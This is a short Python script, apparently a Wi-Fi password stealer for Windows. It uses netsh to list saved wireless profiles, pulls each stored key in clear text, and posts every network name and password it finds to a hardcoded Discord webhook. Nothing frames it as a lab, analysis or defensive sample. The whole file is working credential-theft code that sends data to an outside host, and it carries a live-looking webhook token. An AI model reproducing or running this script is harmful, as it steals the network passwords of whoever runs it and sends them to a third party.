import subprocess
import requests
divider = {
	"username": ":3",
	"content": "---------------------------------------------------------------------------"
}
url = "https://discord.com/api/webhooks/1266385100971573310/BCQLIWzL5ZJKue5Kj--qgB3yF4pspyPqxrPnwTuuXBVcPa-N3R70OPryWBy6Os1TS6Yl"
x = requests.post(url, json=divider)
meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
data = meta_data.decode('utf-8', errors ="backslashreplace")
data = data.split('\n')
profiles = []
for i in data:
	if "All User Profile" in i :
		i = i.split(":")
		i = i[1]
		i = i[1:-1]
		profiles.append(i) 
for i in profiles:
	try:
		results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'])
		results = results.decode('utf-8', errors ="backslashreplace")
		results = results.split('\n')
		results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
		try:
			data = {
				"username": ":3",
				"content": "{:<40}| {:<}".format(i, results[0])
			}
			x = requests.post(url, json=data)
		except IndexError:
			ehehe = 1
	except subprocess.CalledProcessError:
		print("Encoding Error Occurred")
